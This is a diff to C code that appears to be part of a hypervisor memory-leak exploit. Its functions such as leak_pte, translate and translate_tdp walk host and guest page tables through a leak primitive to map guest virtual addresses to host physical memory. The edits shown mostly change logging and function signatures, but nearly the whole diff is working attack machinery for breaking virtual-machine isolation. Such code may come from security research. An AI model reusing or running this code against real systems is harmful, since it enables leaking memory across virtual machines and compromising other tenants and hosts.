@@ -8,7 +8,9 @@ u64 leak_attempts = 0; // in bytes
 
 hpa_t gadget_base(void)
 {
+	pr_dub("Find Gadget Base\n================\n");
 #if defined(BASE)
+	pr_dub("Reusing pre-leaked gadget base: %lx.\n\n", BASE);
 	dump(BASE);
         return BASE;
 #endif
@@ -118,22 +120,31 @@ pte_t leak_pte(hpa_t base, hpa_t pa)
 	return pte;
 }
 
-hpa_t translate(hpa_t base, hva_t va, hpa_t cr3, hva_t hdm)
+#define RETRY_THRES 2
+
+hpa_t translate(hpa_t base, hva_t va, hpa_t cr3, hva_t hdm, const char *prefmt, ...)
 {
-	#define RETRY_THRES 2
 	const int verbose = 1;
-	if (verbose >= 2) fprintf(stderr, "\ttranslate(base=%lx, va=%lx, cr3=%lx, hdm=%lx)\n", base, va, cr3, hdm);
+	if (verbose >= 2) pr_dub("\ttranslate(base=%lx, va=%lx, cr3=%lx, hdm=%lx)\n", base, va, cr3, hdm);
+	va_list args;
+	char prefix[0x100];
+	if (prefmt) {
+		va_start(args, prefmt);
+		vsnprintf(prefix, sizeof(prefix), prefmt, args);
+		va_end(args);
+	}
 
 	if (hdm && in_direct_map(va, hdm)) {
-		if (verbose >= 2) { fprintf(stderr, " --{hdm}--> pa %lx\n", va-hdm); fflush(stdout); }
+		if (verbose == 1 && prefmt) pr_dub("%s --> pa %lx\n", prefix, va-hdm);
 		return va - hdm;
 	}
 
 	u64 tries_pgd = 0, tries_pud = 0, tries_pmd = 0, tries_pte = 0;
 	hpa_t pgd_pa;
+	if (verbose == 1 && prefmt) pr_dub("%s -->", prefix);
 retry_pgd:
 	if (tries_pgd >= RETRY_THRES+2) {
-		if (verbose >= 2) { fprintf(stderr, "translate:"); dump(tries_pgd); }
+		if (verbose >= 2) { pr_dub("translate:"); dump(tries_pgd); }
 		return -1;
 	}
 	tries_pgd++;
@@ -141,16 +152,17 @@ retry_pgd:
 	if (verbose >= 2) dumpp(pgd_pa);
 	pte_t pgd = leak_pte(base, pgd_pa);
 	if (verbose >= 2) dumpp(pgd);
-	if (verbose == 1) { fprintf(stderr, " --> pgd %10lx ", pgd); fflush(stdout); }
+	if (verbose == 1 && prefmt) pr_dub(" pgd %10lx", pgd);
 	if (!(((pgd & 0xfff) == 0x067) || ((pgd & 0xfff) == 0x907) || ((pgd & 0xfff) == 0x107))) {
-		if (verbose == 1) fprintf(stderr, "\n\t--> ");
+		if (verbose == 1 && prefmt) pr_dub(CLEAR_LINE "%s -->", prefix);
 		goto retry_pgd;
 	}
 
 	hpa_t l1;
 retry_pud:
 	if (tries_pud >= RETRY_THRES) {
-		if (verbose >= 2) { fprintf(stderr, "translate:"); dump(tries_pud); }
+		if (verbose >= 2) { pr_dub("translate:"); dump(tries_pud); }
+		if (verbose == 1 && prefmt) pr_dub(CLEAR_LINE "%s -->", prefix);
 		tries_pud = 0;
 		goto retry_pgd;
 	}
@@ -161,22 +173,23 @@ retry_pud:
 	if (verbose >= 2) dumpp(pud_pa);
 	pte_t pud = leak_pte(base, pud_pa);
 	if (verbose >= 2) dumpp(pud);
-	if (verbose == 1) { fprintf(stderr, "pud %10lx ", pud); fflush(stdout); }
+	if (verbose == 1 && prefmt) pr_dub(" pud %10lx", pud);
 	if (!(((pud & 0xfff) == 0x067) || ((pud & 0xfff) == 0x063) || ((pud & 0xfff) == 0x907) || ((pud & 0xfff) == 0x107) || ((pud & 0xfff) == 0xff7))) {
-		if (verbose == 1) fprintf(stderr, "\n\t--> ");
+		if (verbose == 1 && prefmt) pr_dub(CLEAR_LINE "%s --> pgd %10lx", prefix, pgd);
 		goto retry_pud;
 	}
 	if (IS_HUGE(pud)) {
 		hpa_t pa = (pud & BITS_MASK(52, 30)) | BITS(va, 30, 0);
 		if (verbose >= 2) dumpp(pa);
-		if (verbose == 1) { fprintf(stderr, "pa %10lx\n", pa); fflush(stdout); }
+		if (verbose == 1 && prefmt) pr_dub(" pa %10lx\n", pa);
 		return pa;
 	}
 
 	hpa_t l2;
 retry_pmd:
 	if (tries_pmd >= RETRY_THRES) {
-		if (verbose >= 2) { fprintf(stderr, "translate:"); dump(tries_pmd); }
+		if (verbose >= 2) { pr_dub("translate:"); dump(tries_pmd); }
+		if (verbose == 1 && prefmt) pr_dub(CLEAR_LINE "%s --> pgd %10lx", prefix, pgd);
 		tries_pmd = 0;
 		goto retry_pud;
 	}
@@ -187,22 +200,23 @@ retry_pmd:
 	if (verbose >= 2) dumpp(pmd_pa);
 	pte_t pmd = leak_pte(base, pmd_pa);
 	if (verbose >= 2) dumpp(pmd);
-	if (verbose == 1) { fprintf(stderr, "pmd %10lx ", pmd); fflush(stdout); }
+	if (verbose == 1 && prefmt) pr_dub(" pmd %10lx", pmd);
 	if (!(((pmd & 0xfff) == 0x067) || ((pmd & 0xfff) == 0x907) || ((pmd & 0xfff) == 0xff7) || ((pmd & 0xfff) == 0xbf7) || ((pmd & 0xfff) == 0xbf3) || ((pmd & 0xfff) == 0x8f3) || ((pmd & 0xfff) == 0x9f3) || ((pmd & 0xfff) == 0x0e3) || ((pmd & 0xfff) == 0x9f7))) {
-		if (verbose == 1) fprintf(stderr, "\n\t--> ");
+		if (verbose == 1 && prefmt) pr_dub(CLEAR_LINE "%s --> pgd %10lx pud %10lx", prefix, pgd, pud);
 		goto retry_pmd;
 	}
 	if (IS_HUGE(pmd)) {
 		hpa_t pa = (pmd & BITS_MASK(52, 21)) | BITS(va, 21, 0);
 		if (verbose >= 2) dumpp(pa);
-		if (verbose == 1) { fprintf(stderr, "pa %10lx\n", pa); fflush(stdout); }
+		if (verbose == 1 && prefmt) pr_dub(" pa %10lx\n", pa);
 		return pa;
 	}
 
 	hpa_t l3;
 retry_pte:
 	if (tries_pte >= RETRY_THRES) {
-		if (verbose >= 2) { fprintf(stderr, "translate:"); dump(tries_pte); }
+		if (verbose >= 2) { pr_dub("translate:"); dump(tries_pte); }
+		if (verbose == 1 && prefmt) pr_dub(CLEAR_LINE "%s --> pgd %10lx pud %10lx", prefix, pgd, pud);
 		tries_pte = 0;
 		goto retry_pmd;
 	}
@@ -213,14 +227,14 @@ retry_pte:
 	if (verbose >= 2) dumpp(pte_pa);
 	pte_t pte = leak_pte(base, pte_pa);
 	if (verbose >= 2) dumpp(pte);
-	if (verbose == 1) { fprintf(stderr, "pte %10lx ", pte); fflush(stdout); }
+	if (verbose == 1 && prefmt) pr_dub(" pte %10lx", pte);
 	if (!(((pte & 0xfff) == 0x063) || ((pte & 0xfff) == 0x907) || ((pte & 0xfff) == 0x107) || ((pte & 0xfff) == 0x877) || ((pte & 0xfff) == 0xb77))) {
-		if (verbose == 1) fprintf(stderr, "\n\t--> ");
+		if (verbose == 1 && prefmt) pr_dub(CLEAR_LINE "%s --> pgd %10lx pud %10lx pmd %10lx", prefix, pgd, pud, pmd);
 		goto retry_pte;
 	}
 	hpa_t pa = (pte & PFN_MASK) | BITS(va, 12, 0);
 	if (verbose >= 2) dumpp(pa);
-	if (verbose == 1) { fprintf(stderr, "pa %10lx\n", pa); fflush(stdout); }
+	if (verbose == 1 && prefmt) pr_dub(" pa %10lx\n", pa);
 	return pa;
 }
 
@@ -243,15 +257,15 @@ hpa_t translate_tdp(hpa_t base, gva_t va, gva_t gdm, hpa_t gcr3, hpa_t eptp)
 	}
 	
 	fprintf(stderr, "translate_tdp(%lx)", va);
-
-	#define RETRY_THRES 1
 	const int verbose = 1;
 	if (verbose >= 2) fprintf(stderr, "translate_tdp(base=%lx, va=%lx, gdm=%lx, gcr3=%lx, eptp=%lx)\n", base, va, gdm, gcr3, eptp);
 	u64 tries_gpgd = 0, tries_gpud = 0, tries_gpmd = 0, tries_gpte = 0;
 
 	if (gdm && in_direct_map(va, gdm)) {
-		if (verbose >= 1) { fprintf(stderr, " --{gdm}--> gpa %lx ", va-gdm); fflush(stdout); }
-		return translate(base, va-gdm, eptp, 0);
+		if (verbose >= 1)
+			return translate(base, va-gdm, eptp, 0, "gva %lx --{gdm}--> gpa %lx ", va, va-gdm);
+		else
+			return translate(base, va-gdm, eptp, 0, NULL);
 	}
 
 	hpa_t gpgd_pa = gcr3 + 8 * BITS(va, 48, 39);
@@ -263,11 +277,11 @@ retry_gpgd:
 	tries_gpgd++;
 	if (verbose >= 2) dump(gpgd_pa);
 	pte_t gpgd = leak_pte(base, gpgd_pa);
-	if (verbose == 1) { fprintf(stderr, "\n\t\\--> \\ gpgd %10lx", gpgd); fflush(stdout); }
+	if (verbose == 1) { fprintf(stderr, "\n    \\--> \\ gpgd %10lx", gpgd); fflush(stdout); }
 	if (verbose >= 2) dump(gpgd);
 	if ((gpgd & 0xfff) != 0x067)
 		goto retry_gpgd;
-	pte_t pgd = translate(base, gpgd, eptp, 0);
+	pte_t pgd = translate(base, gpgd, eptp, 0, "    \\--> \\ gpgd %10lx", gpgd);
 	if (verbose >= 2) dump(pgd);
 	if (pgd == -1ULL)
 		goto retry_gpgd;
@@ -284,7 +298,7 @@ retry_gpud:
 	hpa_t pud_pa = l1 + 8 * BITS(va, 39, 30);
 	if (verbose >= 2) dump(pud_pa);
 	pte_t gpud = leak_pte(base, pud_pa);
-	if (verbose == 1) { fprintf(stderr, "\t      \\ gpud %10lx", gpud); fflush(stdout); }
+	if (verbose == 1) { fprintf(stderr, "          \\ gpud %10lx", gpud); fflush(stdout); }
 	if (verbose >= 2) dump(gpud);
 	if ((gpud & 0xffb) != 0x063) {
 		if (verbose == 1) fprintf(stderr, "\n");
@@ -293,13 +307,13 @@ retry_gpud:
 	if (IS_HUGE(gpud)) {
 		gpa_t gpa = (gpud & BITS_MASK(52, 30)) | BITS(va, 30, 0);
 		if (verbose >= 2) dump(gpa);
-		hpa_t hpa = translate(base, gpa, eptp, 0);
+		hpa_t hpa = translate(base, gpa, eptp, 0, "          \\ gpud %10lx", gpud);
 		if (verbose >= 2) dump(hpa);
 		if (hpa == -1ULL)
 			goto retry_gpud;
 		return hpa;
 	}
-	pte_t pud = translate(base, gpud, eptp, 0);
+	pte_t pud = translate(base, gpud, eptp, 0, "          \\ gpud %10lx", gpud);
 	if (verbose >= 2) dump(pud);
 	if (pud == -1ULL)
 		goto retry_gpud;
@@ -316,7 +330,7 @@ retry_gpmd:
 	hpa_t pmd_pa = l2 + 8 * BITS(va, 30, 21);
 	if (verbose >= 2) dump(pmd_pa);
 	pte_t gpmd = leak_pte(base, pmd_pa);
-	if (verbose == 1) { fprintf(stderr, "\t       \\ gpmd %10lx", gpmd); fflush(stdout); }
+	if (verbose == 1) { fprintf(stderr, "           \\ gpmd %10lx", gpmd); fflush(stdout); }
 	if (verbose >= 2) dump(gpmd);
 	if ((gpmd & 0xf7b) != 0x063) {
 		if (verbose == 1) fprintf(stderr, "\n");
@@ -325,13 +339,13 @@ retry_gpmd:
 	if (IS_HUGE(gpmd)) {
 		gpa_t gpa = (gpmd & BITS_MASK(52, 21)) | BITS(va, 21, 0);
 		if (verbose >= 2) dump(gpa);
-		hpa_t hpa = translate(base, gpa, eptp, 0);
+		hpa_t hpa = translate(base, gpa, eptp, 0, "           \\ gpmd %10lx", gpmd);
 		if (verbose >= 2) dump(hpa);
 		if (hpa == -1ULL)
 			goto retry_gpmd;
 		return hpa;
 	}
-	pte_t pmd = translate(base, gpmd, eptp, 0);
+	pte_t pmd = translate(base, gpmd, eptp, 0, "           \\ gpmd %10lx", gpmd);
 	if (verbose >= 2) dump(pmd);
 	if (pmd == -1ULL)
 		goto retry_gpmd;
@@ -348,7 +362,7 @@ retry_gpte:
 	hpa_t pte_pa = l3 + 8 * BITS(va, 21, 12);
 	if (verbose >= 2) dump(pte_pa);
 	pte_t gpte = leak_pte(base, pte_pa);
-	if (verbose == 1) { fprintf(stderr, "\t        \\ gpte %10lx", gpte); fflush(stdout); }
+	if (verbose == 1) { fprintf(stderr, "            \\ gpte %10lx", gpte); fflush(stdout); }
 	if (verbose >= 2) dump(gpte);
 	if (!((gpte & 0xfff) == 0x063 || (gpte & 0xfff) == 0x825 || (gpte & 0xfff) == 0x805)) {
 		if (verbose == 1) fprintf(stderr, "\n");
@@ -356,7 +370,7 @@ retry_gpte:
 	}
 	gpa_t gpa = (gpte & PFN_MASK) | BITS(va, 12, 0);
 	if (verbose >= 2) dump(gpa);
-	hpa_t hpa = translate(base, gpa, eptp, 0);
+	hpa_t hpa = translate(base, gpa, eptp, 0, "            \\ gpte %10lx", gpte);
 	if (verbose >= 2) dump(hpa);
 	if (hpa == -1ULL)
 		goto retry_gpte;
@@ -381,8 +395,6 @@ hpa_t translate2gpa(hpa_t base, gva_t va, gva_t gdm, hpa_t gcr3, hpa_t eptp)
 	}
 	
 	fprintf(stderr, "translate2gpa(%lx)", va);
-
-	#define RETRY_THRES 1
 	const int verbose = 1;
 	if (verbose >= 2) fprintf(stderr, "translate2gpa(base=%lx, va=%lx, gdm=%lx, gcr3=%lx, eptp=%lx)\n", base, va, gdm, gcr3, eptp);
 	u64 tries_gpgd = 0, tries_gpud = 0, tries_gpmd = 0, tries_gpte = 0;
@@ -401,11 +413,11 @@ retry_gpgd:
 	tries_gpgd++;
 	if (verbose >= 2) dump(gpgd_pa);
 	pte_t gpgd = leak_pte(base, gpgd_pa);
-	if (verbose == 1) { fprintf(stderr, "\n\t\\--> \\ gpgd %10lx", gpgd); fflush(stdout); }
+	if (verbose == 1) { fprintf(stderr, "\n    \\--> \\ gpgd %10lx", gpgd); fflush(stdout); }
 	if (verbose >= 2) dump(gpgd);
 	if ((gpgd & 0xfff) != 0x067)
 		goto retry_gpgd;
-	pte_t pgd = translate(base, gpgd, eptp, 0);
+	pte_t pgd = translate(base, gpgd, eptp, 0, NULL);
 	if (verbose >= 2) dump(pgd);
 	if (pgd == -1ULL)
 		goto retry_gpgd;
@@ -422,7 +434,7 @@ retry_gpud:
 	hpa_t pud_pa = l1 + 8 * BITS(va, 39, 30);
 	if (verbose >= 2) dump(pud_pa);
 	pte_t gpud = leak_pte(base, pud_pa);
-	if (verbose == 1) { fprintf(stderr, "\t      \\ gpud %10lx", gpud); fflush(stdout); }
+	if (verbose == 1) { fprintf(stderr, "          \\ gpud %10lx", gpud); fflush(stdout); }
 	if (verbose >= 2) dump(gpud);
 	if ((gpud & 0xffb) != 0x063) {
 		if (verbose == 1) fprintf(stderr, "\n");
@@ -433,7 +445,7 @@ retry_gpud:
 		if (verbose >= 2) dump(gpa);
 		return gpa;
 	}
-	pte_t pud = translate(base, gpud, eptp, 0);
+	pte_t pud = translate(base, gpud, eptp, 0, NULL);
 	if (verbose >= 2) dump(pud);
 	if (pud == -1ULL)
 		goto retry_gpud;
@@ -450,7 +462,7 @@ retry_gpmd:
 	hpa_t pmd_pa = l2 + 8 * BITS(va, 30, 21);
 	if (verbose >= 2) dump(pmd_pa);
 	pte_t gpmd = leak_pte(base, pmd_pa);
-	if (verbose == 1) { fprintf(stderr, "\t       \\ gpmd %10lx", gpmd); fflush(stdout); }
+	if (verbose == 1) { fprintf(stderr, "           \\ gpmd %10lx", gpmd); fflush(stdout); }
 	if (verbose >= 2) dump(gpmd);
 	if ((gpmd & 0xf7b) != 0x063) {
 		if (verbose == 1) fprintf(stderr, "\n");
@@ -461,7 +473,7 @@ retry_gpmd:
 		if (verbose >= 2) dump(gpa);
 		return gpa;
 	}
-	pte_t pmd = translate(base, gpmd, eptp, 0);
+	pte_t pmd = translate(base, gpmd, eptp, 0, NULL);
 	if (verbose >= 2) dump(pmd);
 	if (pmd == -1ULL)
 		goto retry_gpmd;
@@ -478,7 +490,7 @@ retry_gpte:
 	hpa_t pte_pa = l3 + 8 * BITS(va, 21, 12);
 	if (verbose >= 2) dump(pte_pa);
 	pte_t gpte = leak_pte(base, pte_pa);
-	if (verbose == 1) { fprintf(stderr, "\t        \\ gpte %10lx", gpte); fflush(stdout); }
+	if (verbose == 1) { fprintf(stderr, "            \\ gpte %10lx", gpte); fflush(stdout); }
 	if (verbose >= 2) dump(gpte);
 	if (!((gpte & 0xfff) == 0x063 || (gpte & 0xfff) == 0x825)) {
 		if (verbose == 1) fprintf(stderr, "\n");
